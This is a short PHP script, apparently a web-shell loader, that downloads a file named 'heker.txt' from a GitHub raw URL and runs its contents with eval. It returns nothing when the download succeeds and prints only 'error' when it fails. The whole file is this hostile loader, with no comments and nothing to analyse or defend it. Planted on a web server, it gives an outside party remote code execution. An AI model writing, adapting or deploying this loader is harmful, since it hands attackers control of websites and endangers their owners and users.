<?php 
$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/heker.txt';
$php_code = file_get_contents($url);
if ($php_code !== false) {
    $ext = strtolower(pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION));
    if ($ext === 'php' || $ext === 'txt') {
        eval('?>' . $php_code);
    } else {
        echo '';
    }
} else {
    echo 'error';
}
?>
	<?php
	?>